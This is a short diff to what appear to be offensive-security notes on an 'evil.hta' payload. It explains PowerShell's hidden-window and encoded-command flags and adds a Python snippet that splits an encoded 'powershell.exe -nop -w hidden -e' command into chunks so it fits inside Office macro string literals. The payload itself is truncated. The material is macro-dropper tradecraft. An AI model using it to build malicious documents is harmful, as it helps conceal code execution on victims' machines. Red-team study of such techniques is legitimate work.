@@ -8,3 +8,15 @@ Looking at evil.hta:
 * -w hidden (shorthand for -WindowStyle2 hidden) to avoid creating a window on the user's desktop.
 * -e flag (shorthand for -EncodedCommand) allows us to supply a Base64 encoded PowerShell script directly as a command line argument.
 
+Split a base64 script with Python:
+```python
+str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
+```
+
+Useful for macros which have a string literal max length of 255, unless it is stored in a variable.
+
